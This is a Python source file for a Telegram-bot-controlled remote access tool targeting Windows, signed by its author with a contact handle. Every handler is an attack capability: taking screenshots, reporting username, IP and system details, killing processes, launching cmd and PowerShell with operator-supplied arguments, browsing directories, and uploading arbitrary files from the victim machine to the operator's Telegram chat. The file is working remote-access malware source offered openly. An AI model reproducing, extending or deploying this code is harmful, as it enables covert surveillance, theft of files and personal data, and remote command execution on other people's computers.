#CODED BY LEMON
#Remote Administration Tools

import os
from PIL import ImageGrab
import subprocess
import platform
import webbrowser
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import requests
import time

#----------------------------------------------------------------#
bot = Bot(token='')                                              #
dp = Dispatcher(bot)                                             #
bot_token = ''                                                   #
#----------------------------------------------------------------#


#Handlers--------------------------------------------------------#

#Open Handler
@dp.message_handler(commands = ['start', 'Start', 'Run', 'run'])
async def start_message(message: types.Message):
	chat_id = message.chat.id
	await bot.send_message(chat_id=chat_id, text= '☣Coded by LEMON☣')
	time.sleep(1)
	await bot.send_message(chat_id=chat_id, text='Learn commands - /commands')
	time.sleep(1)
	await bot.send_message(chat_id=chat_id, text='Cooperation, ideas, wishes - @Lemonochel')
	time.sleep(1)
	await bot.send_message(chat_id=chat_id, text='Tested only on Windows 10')

#Handler commands
@dp.message_handler(commands = ['help', 'commands', 'Help', 'Commands'])
async def send_help(message: types.Message):
	chat_id = message.chat.id
	await bot.send_message(chat_id=chat_id, text='Commands: \n /Screen - get screenshot \n /Info - user information \n /Kill_process - kill process by name.exe' + 
						   '\n /Cmd - open cmd \n /Open_url - open url in browser \n /Ls - show all files in a directory \n /Cd - change directory' +
						   '\n /Download - download file(the file must not be empty; file name must be one word) \n /Resmon - open resource monitor' +
						   '\n /Msconfig - open msconfig(need administrator rights) \n /Powershell - open powershell \n /Taskmgr - open taskmgr(need administrator rights)')	
#Handler screen
@dp.message_handler(commands = ['Screen', 'screen', 'S', 's'])
async def get_screen(message: types.Message):
	chat_id = message.chat.id
	screen = ImageGrab.grab()
	screen.save(os.getenv("APPDATA") + '\\Screenshot.jpg')
	screen = open(os.getenv("APPDATA") + '\\Screenshot.jpg', 'rb')
	await bot.send_photo(chat_id=chat_id, photo=screen)

#Handler Info user
@dp.message_handler(commands = ['info', 'Info', 'I', 'i'])
async def send_info(message: types.Message):
	chat_id = message.chat.id
	username = os.getlogin()
	r = requests.get('http://ip.42.pl/raw')
	IP = r.text
	windows = platform.platform()
	processor = platform.processor()
	await bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
		"\nProcessor: " + processor)

#Handler kill process
@dp.message_handler(commands = ['kill_process', 'Kill_process', 'k', 'K'])
async def kill_process(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text) 
	subprocess.call("taskkill /IM " + user_msg.split(" ")[1])
	await bot.send_message(chat_id, text='Done')

#Handler open cmd
@dp.message_handler(commands = ['Cmd', 'cmd', 'c', 'C'])
async def cmd_command(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	subprocess.Popen([r'C:\\Windows\\System32\\cmd.exe', user_msg.split(" ")[1]])
	await bot.send_message(chat_id, text='Done')

#Handler open url
@dp.message_handler(commands = ['open_url', 'Open_url', 'O', 'o'])
async def url_open_command(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	url = user_msg.split(" ")[1]
	webbrowser.open_new_tab(url)
	await bot.send_message(chat_id, text='Done')

#Handler listdir
@dp.message_handler(commands = ['ls', 'Ls', 'listdir', 'Listdir'])
async def listdir_command(message: types.Message):
	chat_id = message.chat.id
	dirs = '\n'.join(os.listdir(path="."))
	await bot.send_message(chat_id, "Files: " + "\n" + dirs)

#Handler changed dir
@dp.message_handler(commands = ['cd', 'Cd'])
async def cd_dir(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	path2 = user_msg.split(" ")[1]
	os.chdir(path2)
	await bot.send_message(chat_id, 'Directory changed to ' + path2)

#Handler download
@dp.message_handler(commands = ['download', 'Download', 'D', 'd'])
async def download_file(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	file_name = user_msg.split(" ")[1]
	doc = {'document': open(file_name, 'rb')}
	requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + str(chat_id) , files=doc)

#Handler resource monitor
@dp.message_handler(commands = ['r', 'Resmon', 'R', 'resmon'])
async def download_file(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	subprocess.Popen([r'C:\\Windows\\System32\\resmon.exe', user_msg.split(" ")[1]])
	await bot.send_message(chat_id, text='Done')

#Handler window msconfig
@dp.message_handler(commands = ['M', 'm', 'msconfig', 'Msconfig'])
async def download_file(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	subprocess.Popen([r'C:\\Windows\\System32\\msconfig.exe', user_msg.split(" ")[1]])
	await bot.send_message(chat_id, text='Done')

#Handler open powershell
@dp.message_handler(commands = ['P', 'p', 'powershell', 'Powershell'])
async def download_file(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	subprocess.Popen([r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', user_msg.split(" ")[1]])
	await bot.send_message(chat_id, text='Done')

#Handler open taskmgr
@dp.message_handler(commands = ['T', 't', 'taskmgr', 'Taskmgr'])
async def download_file(message: types.Message):
	chat_id = message.chat.id
	user_msg = "{0}".format(message.text)
	subprocess.Popen([r'C:\Windows\System32\taskmgr.exe', user_msg.split(" ")[1]])
	await bot.send_message(chat_id, text='Done')





executor.start_polling(dp)


